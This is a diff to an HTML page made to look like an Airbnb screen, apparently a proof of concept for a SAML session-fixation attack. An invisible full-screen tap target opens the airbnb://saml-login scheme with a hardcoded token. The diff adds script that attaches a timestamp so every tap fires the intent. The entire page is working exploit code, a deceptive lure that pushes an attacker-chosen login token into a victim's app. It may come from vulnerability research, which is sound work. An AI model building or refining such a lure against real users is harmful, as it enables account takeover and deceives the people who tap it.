@@ -7,7 +7,6 @@
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; background: #FF5A5F; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
-    /* Full-screen invisible tap target — opens airbnb:// on any tap */
     #tap {
       display: block;
       position: fixed;
@@ -35,12 +34,7 @@
 </head>
 <body>
 
-<!--
-  Full-screen anchor — airbnb:// custom scheme is registered by the app.
-  Chrome on Android opens the registered app directly when user taps any link
-  with a custom scheme. No intent://, no App Links needed.
--->
-<a id="tap" href="airbnb://saml-login?saml_token=6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF"></a>
+<a id="tap" href="#"></a>
 
 <div class="screen">
   <svg class="logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
@@ -51,6 +45,21 @@
 </div>
 
 <p class="hint">Tap anywhere to continue</p>
+
+<script>
+  // Chrome deduplicates custom-scheme navigations to the exact same URL within
+  // a tab session — subsequent taps are silently dropped. Appending a timestamp
+  // nonce makes each invocation a distinct URL so Chrome fires the intent every time.
+  // The Airbnb app ignores unknown query params, so saml_token still gets extracted.
+  var TOKEN = "6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF";
+  var tap = document.getElementById("tap");
+
+  tap.addEventListener("click", function(e) {
+    e.preventDefault();
+    var url = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN) + "&_t=" + Date.now();
+    window.location.href = url;
+  });
+</script>
 
 </body>
 </html>
